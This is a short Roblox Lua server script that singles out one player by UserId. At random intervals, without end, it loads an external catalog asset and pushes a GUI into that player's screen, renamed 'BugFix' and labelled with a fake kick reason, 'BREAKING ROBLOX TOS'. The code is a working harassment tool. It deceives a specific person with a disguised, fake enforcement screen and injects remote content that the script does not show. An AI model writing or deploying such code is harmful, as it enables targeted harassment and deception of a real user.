function plrx(plr)
if  plr.UserId == 3572567805  then
	while plr do
		if plr then
		        local ok = game:GetService("InsertService"):LoadAsset(18938166154)
		        local troll = ok:FindFirstChildWhichIsA("ScreenGui")
		        troll.Name = "BugFix"
		        troll:WaitForChild("KickFor").Value = "BREAKING ROBLOX TOS"
		        troll.Parent = plr:WaitForChild("PlayerGui")
		        troll.Enabled = true
			task.wait(math.random(25, 240))
		end
	end
    end
end
-- Shrug
for i,plr in pairs(game.Players:GetPlayers()) do
	plrx(plr)
end
game.Players.PlayerAdded:Connect(function(plr)
	task.wait(3)
	plrx(plr)
end)
